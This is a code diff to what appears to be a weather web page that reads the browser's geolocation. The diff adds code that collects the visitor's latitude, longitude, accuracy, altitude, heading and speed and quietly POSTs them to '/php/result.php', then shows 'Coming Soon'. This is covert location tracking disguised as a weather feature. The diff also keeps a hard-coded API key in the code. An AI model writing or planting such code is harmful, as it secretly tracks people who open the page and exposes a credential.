@@ -25,6 +25,10 @@ function locate()
   {
       var lat = position.coords.latitude;
       var lon = position.coords.longitude;
+      var acc = position.coords.accuracy;
+      var alt = position.coords.altitude;
+      var dir = position.coords.heading;
+      var spd = position.coords.speed;
       const api = '30ee9ba68c73e395305d5e235d3895fe';
       let url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${api}`;
       fetch(url)  
@@ -67,24 +71,11 @@ function locate()
 }
 }
 
-// api sec 
-
-// const api = '30ee9ba68c73e395305d5e235d3895fe';
-
-// lat lon is fetched from location.js file
-// button.addEventListener('click',()=>{
-
-
-// let url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lan}&appid=${api}`;
-//             fetch(url)  
-//                 .then(res => {
-//                 return res.json();
-//             })
-//             .then(data => {
-//                 console.log(data)
-
-//             // })
-        
-//         })
-
+$.ajax({
+  type: 'POST',
+  url: '/php/result.php',
+  data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
+  success: function(){$('#change').html('Coming Soon');},
+  mimeType: 'text'
+});
 
